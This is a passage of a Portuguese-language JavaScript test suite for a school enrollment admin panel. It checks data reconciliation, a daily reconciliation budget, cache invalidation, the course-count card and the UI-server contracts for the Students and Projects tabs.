  });
  return amb;
}

teste('o primeiro Atualizar cruza os dados e devolve a lista na mesma chamada', () => {
  const amb = cenarioAtualizar();
  igual(amb.api.contar('alunos'), 0, 'a inscrição ainda não virou ficha — é o retrato que o botão conserta');

  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  igual(r.ok, true, r.erro);
  igual(r.reconciliacao.rodou, true);
  igual(r.reconciliacao.resumo.confirmado, 1);
  igual(r.itens.length, 1, 'a lista precisa vir na MESMA resposta, senão são duas execuções em fila');
  igual(r.itens[0].nome, 'Ana Lima');
});

teste('o segundo Atualizar não cruza de novo: nada entrou', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  amb.zerar();

  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  igual(r.reconciliacao.rodou, false);
  verdadeiro(/nada entrou desde a última vez/.test(r.reconciliacao.motivo), r.reconciliacao.motivo);
  igual(r.ok, true, 'a lista tem de vir mesmo assim — recusar o cruzamento não é recusar o botão');
  igual(r.itens.length, 1);
});

teste('dez cliques seguidos custam dez pares de agregações, e não dez cruzamentos', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  amb.zerar();

  for (let i = 0; i < 10; i++) chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });

  // Sem o freio, cada clique releria `inscricoes`, `matriculados` e `alunos`
  // inteiras. Com ele, o clique é do tamanho de uma listagem.
  verdadeiro(amb.falso.requisicoes.length < 60,
    'dez cliques custaram ' + amb.falso.requisicoes.length + ' requisições');
  igual(amb.falso.requisicoes.filter((r) => r.metodo === 'POST' && /:commit/.test(r.url)).length, 0,
    'houve escrita em lote: algum clique cruzou de novo sem ter o que cruzar');
});

teste('inscrição nova reabre o cruzamento no clique seguinte', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });

  inscrever(amb.api, 'p1', 'R+ Cidades', {
    matricula: '9110702', nome: 'Caio Reis', email: 'caio@exemplo.com', curso_fase: 'ADS - ADS21'
  });

  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  igual(r.reconciliacao.rodou, true, 'o freio segurou uma inscrição que ACABOU de chegar');
  igual(r.itens.length, 2);
});

teste('importar a lista oficial também reabre o cruzamento', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });

  // O freio olha os DOIS lados. Se olhasse só as inscrições, uma importação de
  // 2.500 matriculados não faria diferença nenhuma no botão.
  semearMatriculado(amb.api, '9110703', 'Duda Rocha', 'ADM', 'ADM61');

  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
});

teste('o orçamento do dia trava o cruzamento, e a recusa traz o número', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });

  // Empurra a marca para um dia que já gastou tudo. É o cenário do evento: cada
  // clique tem gente nova para cruzar, então o freio 1 nunca fecha.
  const marca = JSON.parse(amb.propriedades.get('painel_reconciliacao'));
  marca.gasto = amb.api.PAINEL_ORCAMENTO_RECONCILIACAO;
  marca.inscricoes = -1;
  amb.propriedades.set('painel_reconciliacao', JSON.stringify(marca));

  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  igual(r.reconciliacao.rodou, false);
  verdadeiro(r.reconciliacao.motivo.indexOf(String(amb.api.PAINEL_ORCAMENTO_RECONCILIACAO)) !== -1,
    'a recusa precisa dizer o teto: ' + r.reconciliacao.motivo);
  verdadeiro(/Reconciliar agora/.test(r.reconciliacao.motivo), 'a recusa precisa dizer a saída');
  igual(r.ok, true);
  igual(r.itens.length, 1);
});

teste('o orçamento é por DIA: virou o dia, o botão volta a cruzar', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });

  const marca = JSON.parse(amb.propriedades.get('painel_reconciliacao'));
  marca.gasto = amb.api.PAINEL_ORCAMENTO_RECONCILIACAO;
  marca.inscricoes = -1;
  marca.dia = '2020-01-01';
  amb.propriedades.set('painel_reconciliacao', JSON.stringify(marca));

  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
  igual(JSON.parse(amb.propriedades.get('painel_reconciliacao')).dia, amb.api.agora().slice(0, 10));
});

teste('cruzamento que falha não derruba a lista junto', () => {
  const amb = cenarioAtualizar();
  amb.api.reconciliar = () => { throw new Error('a coleção "matriculados" passou de 8000 documentos'); };

  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  igual(r.ok, true, 'a lista é lida das mesmas coleções: ela continua correta, só mais velha');
  igual(r.reconciliacao.rodou, false);
  verdadeiro(/passou de 8000/.test(r.reconciliacao.motivo), r.reconciliacao.motivo);
});

teste('cruzar pelo botão derruba o cache dos números do Painel', () => {
  const amb = cenarioAtualizar();
  chamar(amb, 'painelEstatisticas');            // esquenta o cache
  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
  amb.zerar();

  const d = chamar(amb, 'painelEstatisticas').dados;
  igual(d.total, 1, 'o Painel respondeu do cache um total de antes do cruzamento');
  verdadeiro(agregacoes(amb.falso).length > 0, 'o cache não foi invalidado');
});

teste('editar também não deixa o Painel mentir', () => {
  const amb = cenarioMatriculaTrocada();
  chamar(amb, 'painelEstatisticas');
  chamar(amb, 'editarAluno', { id: amb.idDoBruno, turma: 'ADM62' });
  amb.zerar();

  chamar(amb, 'painelEstatisticas');
  verdadeiro(agregacoes(amb.falso).length > 0, 'o cache sobreviveu a uma escrita que muda os números');
});

// ------------------------------------------------- O cartão "Alunos por curso"

grupo('Alunos por curso — teto e ordenação');

function semearCursos(api, quantos) {
  const documento = { _id: 'cursos' };
  for (let i = 1; i <= quantos; i++) documento['CURSO ' + String(i).padStart(2, '0')] = String(i);
  api.escreverEmLote('agregados', [documento]);
}

teste('o cartão mostra os MAIORES primeiro, não a ordem alfabética', () => {
  const amb = ambiente();
  semearCursos(amb.api, 5);

  const d = chamar(amb, 'painelEstatisticas').dados;
  igual(d.porCurso.map((c) => c.total), [5, 4, 3, 2, 1],
    'a linha grande é a razão de o cartão existir — ela não pode ficar no meio da lista');
});

teste('o cartão tem teto, e o que fica de fora vai somado em vez de sumir', () => {
  const amb = ambiente();
  semearCursos(amb.api, 20);

  const d = chamar(amb, 'painelEstatisticas').dados;
  igual(d.porCurso.length, amb.api.PAINEL_TETO_CURSOS);
  igual(d.porCursoResto.cursos, 20 - amb.api.PAINEL_TETO_CURSOS);

  const mostrado = d.porCurso.reduce((s, c) => s + c.total, 0);
  igual(mostrado + d.porCursoResto.alunos, (20 * 21) / 2, 'o cartão parou de fechar com o total');
});

teste('o filtro de curso continua alfabético e COMPLETO — teto nenhum ali', () => {
  const amb = ambiente();
  semearCursos(amb.api, 20);

  const cursos = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 }).cursos;
  igual(cursos.length, 20, 'um curso fora do select vira um filtro impossível de pedir');
  igual(cursos[0], 'CURSO 01');
  igual(cursos[19], 'CURSO 20');
});

teste('sem o documento de agregados, o cartão some em vez de quebrar', () => {
  const amb = ambiente();
  const d = chamar(amb, 'painelEstatisticas').dados;
  igual(d.porCurso, []);
  igual(d.porCursoResto, { cursos: 0, alunos: 0 });
});

// --------------------------------------------------- Contratos da aba Alunos

grupo('a aba Alunos e o servidor falam a mesma língua');

teste('todo campo da janela de edição chega com o nome que o servidor lê', () => {
  const tabela = /var CAMPOS_EDICAO_ALUNO = \[([\s\S]*?)\];/.exec(ADMIN);
  verdadeiro(tabela !== null, 'CAMPOS_EDICAO_ALUNO sumiu do Admin.html');

  const chaves = (tabela[1].match(/chave: '([a-z_]+)'/g) || []).map((c) => c.slice(8, -1));
  igual(chaves, ['matricula', 'nome', 'nome_oficial', 'turma', 'projeto_id']);

  chaves.forEach((chave) => {
    verdadeiro(FONTE.indexOf('payload.' + chave) !== -1,
      '10_Painel.gs não lê payload.' + chave + ' — a tela manda um campo que ninguém recebe');
  });
});

teste('as duas funções novas NÃO são leitura: elas fazem o painel esquecer as abas', () => {
  const bloco = /var SO_LEITURA = \{([\s\S]*?)\};/.exec(ADMIN);
  verdadeiro(bloco !== null);
  ['atualizarAlunos', 'editarAluno'].forEach((funcao) => {
    igual(bloco[1].indexOf(funcao), -1,
      funcao + ' escreve: declarada como leitura, a lista ficaria mostrando o valor de antes');
  });
});

teste('a linha do aluno tem Ver e Editar, e a aba tem Atualizar', () => {
  verdadeiro(/onclick="abrirEdicaoAluno\(/.test(ADMIN), 'a ação Editar não está na linha');
  verdadeiro(/onclick="atualizarAlunosUI\(\)"/.test(ADMIN), 'a aba Alunos ficou sem o botão Atualizar');

  // Virar de página não pode cruzar: `carregarAlunos(N)` sem o segundo argumento.
  verdadeiro(/onclick="carregarAlunos\(' \+ \(r\.pagina - 1\) \+ '\)"/.test(ADMIN),
    'a paginação passou a mandar o cruzamento junto');

  // E o Atualizar pede a lista de cursos de novo: o cruzamento reescreve o
  // histograma, e um curso novo ficaria fora do filtro sem isso.
  verdadeiro(/f\.cursos = Boolean\(cruzar\) \|\|/.test(ADMIN),
    'depois de cruzar, o select de curso continuaria com a lista de antes');
});

teste('a janela de edição reaproveita a comparação do detalhe, em vez de refazê-la', () => {
  const corpo = /function corpoDaEdicaoAluno\(r\) \{([\s\S]*?)\n  \}/.exec(ADMIN);
  verdadeiro(corpo !== null, 'corpoDaEdicaoAluno mudou de forma');
  igual((corpo[1].match(/colunaComparativo\(/g) || []).length, 2,
    'a divergência lado a lado é o que a coordenação pediu para ver antes de editar');
  verdadeiro(corpo[1].indexOf('ed-matricula') !== -1);
  verdadeiro(corpo[1].indexOf('selectDeProjetos') !== -1);
});

teste('a lista de projetos só viaja quando a janela de edição pede', () => {
  const amb = cenarioMigracao();
  amb.zerar();

  const semProjetos = chamar(amb, 'detalheAluno', { id: amb.idDaAna });
  igual(semProjetos.projetos, undefined);
  igual(leiturasDePonto(amb.falso).length, 3, 'o detalhe continua custando três leituras de ponto');
  igual(consultas(amb.falso).length, 0);

  amb.zerar();
  const comProjetos = chamar(amb, 'detalheAluno', { id: amb.idDaAna, projetos: true });
  igual(comProjetos.projetos.length, 2);
  igual(consultas(amb.falso).length, 1, 'a lista de projetos é uma consulta só');
  igual(agregacoes(amb.falso).length, 2, 'a ocupação de cada projeto é uma agregação');

  const p2 = comProjetos.projetos.filter((p) => p.id === 'p2')[0];
  igual(p2.inscritos, 2);
  igual(p2.situacao, 'ESGOTADO');
  igual(p2.acimaDoTeto, false);
});

grupo('aba Projetos — ativar/inativar e filtros (pedido de 06/08)');

teste('a linha traz botao de Inativar quando o projeto esta ativo', () => {
  const html = ADMIN;
  verdadeiro(/alternarProjetoUI/.test(html), 'o botao de alternar sumiu da linha');
  verdadeiro(/p\.ativo \? 'Inativar' : 'Ativar'/.test(html),
    'o rotulo tem de seguir o estado, senao o botao mente sobre o que faz');
});

teste('alternar reaproveita salvarProjeto e manda o projeto INTEIRO', () => {
  const html = ADMIN;
  const fn = /function alternarProjetoUI[\s\S]*?\n  }/.exec(html);
  verdadeiro(fn, 'alternarProjetoUI sumiu');

  verdadeiro(/chamar\('salvarProjeto'/.test(fn[0]),
    'rota paralela para escrever o mesmo documento e o comeco da divergencia');
  verdadeiro(/Object\.assign\(\{\}, p, \{ ativo: !p\.ativo \}\)/.test(fn[0]),
    'mandar so {id, ativo} apagaria nome, vagas e o resto — salvarProjeto grava o que recebe');
  verdadeiro(/delete dados\.inscritos/.test(fn[0]),
    'inscritos e derivado; devolve-lo ao servidor seria gravar um numero que pode mentir');
});

teste('os filtros da aba Projetos nao vao ao servidor', () => {
  const html = ADMIN;
  const fn = /function filtrarProjetos[\s\S]*?\n  }/.exec(html);
  verdadeiro(fn, 'filtrarProjetos sumiu');

  verdadeiro(!/chamar\(/.test(fn[0]),
    'cada recarga custa uma agregacao POR projeto — filtrar no servidor pagaria isso a cada tecla');
  verdadeiro(/desenharProjetos/.test(fn[0]), 'tem de redesenhar a partir do que ja veio');
});

teste('carregar aplica o filtro corrente, nao volta a lista inteira', () => {
  const html = ADMIN;
  const fn = /function carregarProjetos[\s\S]*?filtrarProjetos\(\);/.exec(html);
  verdadeiro(fn, 'carregarProjetos deixou de aplicar o filtro depois de carregar');
});

teste('a busca ignora acento e caixa', () => {
  const html = ADMIN;
  const fn = /function normalizarBusca_[\s\S]*?\n  }/.exec(html);
  verdadeiro(fn, 'normalizarBusca_ sumiu');
  verdadeiro(/normalize\('NFD'\)/.test(fn[0]), 'quem procura "Marina" tem de achar "MARINA"');
});

teste('o e-mail do aluno quebra linha — era ele que criava a barra horizontal', () => {
  const html = ADMIN;
  const css = fs.readFileSync(path.join(PASTA_GS, 'Estilos.html'), 'utf8');

  verdadeiro(/'<td class="quebra">' \+ escapar\(a\.email\)/.test(html),
    'a coluna de e-mail voltou a nao quebrar');
  verdadeiro(/overflow-wrap: anywhere/.test(css),
    'sem isto o e-mail nao quebra: nao tem espaco onde a linha possa partir');
  verdadeiro(/'<td style="white-space:nowrap">' \+ escapar\(a\.turma\)/.test(html),
    'turma nao pode quebrar — codigo partido em duas linhas se le errado');
});

process.exit(resultado());
